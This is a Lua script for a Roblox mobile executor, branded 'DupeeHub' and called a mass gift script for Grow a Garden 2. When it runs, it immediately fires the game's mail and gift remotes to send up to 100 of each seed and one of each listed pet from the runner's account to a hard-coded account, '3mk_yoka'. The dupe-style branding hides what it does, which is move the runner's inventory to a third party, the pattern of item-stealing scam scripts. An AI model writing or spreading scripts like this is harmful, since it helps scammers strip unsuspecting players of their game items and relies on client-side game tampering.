-- Grow a Garden 2 (GAG2) Mass Gift Script for Delta Phone
-- Description: Gifts 100 of each seed and 1 of each best pet to 3mk_yoka
-- Compatible with: Delta Mobile Executor
-- Credit: DupeeHub GAG2 API

local RECIPIENT = "3mk_yoka"
local SEEDS_PER_TYPE = 100
local PETS_PER_TYPE = 1

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local scriptRunning = true
local giftedItems = {}

local function log(message)
    print("[DupeeHub] " .. message)
end

-- All seeds in GAG2
local allSeeds = {
    "Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple", "Bamboo", "Corn",
    "Cactus", "Pineapple", "Mushroom", "Green Bean", "Banana", "Grape", "Coconut", "Mango",
    "Dragon Fruit", "Acorn", "Cherry", "Sunflower", "Venus Fly Trap", "Pomegranate",
    "Poison Apple", "Moon Bloom", "Dragon's Breath", "Ghost Pepper", "Poison Ivy", "Rose"
}

-- Best pets
local bestPets = {
    "Golden Dragon", "Phoenix", "Unicorn", "Shadow Beast", "Crystal Dragon",
    "Legendary Wolf", "Sky Serpent", "Mystic Fox", "Royal Eagle", "Ancient Dragon",
    "Magic Horse", "Cosmic Dragon", "Void Creature", "Star Wolf", "Heaven Phoenix"
}

-- Load Network module
local Net
local function initNetwork()
    pcall(function()
        local ok, m = pcall(require, ReplicatedStorage.SharedModules.Networking)
        if ok then Net = m end
    end)
    return Net ~= nil
end

-- Fire action safely
local function fireAction(path, ...)
    if not Net then return false end
    
    local current = Net
    for part in string.gmatch(path, "[^.]+") do
        if type(current) ~= "table" then return false end
        current = current[part]
    end
    
    if current and current.Fire then
        local args = table.pack(...)
        local ok = pcall(function()
            return current:Fire(table.unpack(args, 1, args.n))
        end)
        return ok
    end
    
    return false
end

-- Gift item multiple times
local function giftItem(itemName, quantity)
    local success = 0
    
    for i = 1, quantity do
        if not scriptRunning then break end
        
        pcall(function()
            -- Method 1: Mailbox.SendMail
            if fireAction("Mailbox.SendMail", RECIPIENT, itemName) then
                success = success + 1
            -- Method 2: Mail.SendItem
            elseif fireAction("Mail.SendItem", RECIPIENT, itemName) then
                success = success + 1
            -- Method 3: Gifts.SendGift
            elseif fireAction("Gifts.SendGift", RECIPIENT, itemName) then
                success = success + 1
            -- Method 4: Direct RemoteEvent fire
            else
                local remotes = ReplicatedStorage:FindFirstChild("RemoteEvents") or ReplicatedStorage:FindFirstChild("Remotes")
                if remotes then
                    for _, remote in ipairs(remotes:GetChildren()) do
                        if (remote.Name:lower():find("mail") or remote.Name:lower():find("gift") or remote.Name:lower():find("send")) and remote:IsA("RemoteEvent") then
                            pcall(function()
                                remote:FireServer(RECIPIENT, itemName)
                                success = success + 1
                            end)
                            break
                        end
                    end
                end
            end
        end)
        
        task.wait(0.2)
    end
    
    return success
end

-- Main gift loop
local function startGifting()
    if not initNetwork() then
        log("❌ Failed to load Network module")
        return
    end
    
    log("🚀 DupeeHub Mass Gift Started!")
    log("📤 Gifting to: " .. RECIPIENT)
    log("🌱 Seeds: 100 of each (" .. #allSeeds .. " types)")
    log("🐾 Pets: 1 of each (" .. #bestPets .. " types)")
    
    local totalGifted = 0
    
    -- Gift all seeds
    log("\n📤 Gifting seeds...")
    for _, seed in ipairs(allSeeds) do
        if not scriptRunning then break end
        
        local sent = giftItem(seed, SEEDS_PER_TYPE)
        if sent > 0 then
            giftedItems[seed] = sent
            totalGifted = totalGifted + sent
            log("✓ " .. seed .. " x" .. sent)
        end
        
        task.wait(0.3)
    end
    
    log("\n📤 Gifting pets...")
    -- Gift all pets
    for _, pet in ipairs(bestPets) do
        if not scriptRunning then break end
        
        local sent = giftItem(pet, PETS_PER_TYPE)
        if sent > 0 then
            giftedItems["pet_" .. pet] = sent
            totalGifted = totalGifted + sent
            log("✓ " .. pet .. " x" .. sent)
        end
        
        task.wait(0.3)
    end
    
    log("\n✅ GIFTING COMPLETE!")
    log("📊 Total items gifted: " .. totalGifted)
    log("📤 Recipient: " .. RECIPIENT)
end

-- Stop on F6
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.F6 then
        scriptRunning = false
        log("🛑 Script stopped")
    end
end)

-- Start gifting
startGifting()

game:BindToClose(function()
    scriptRunning = false
end)

log("✅ DupeeHub Mass Gift Script Loaded!")
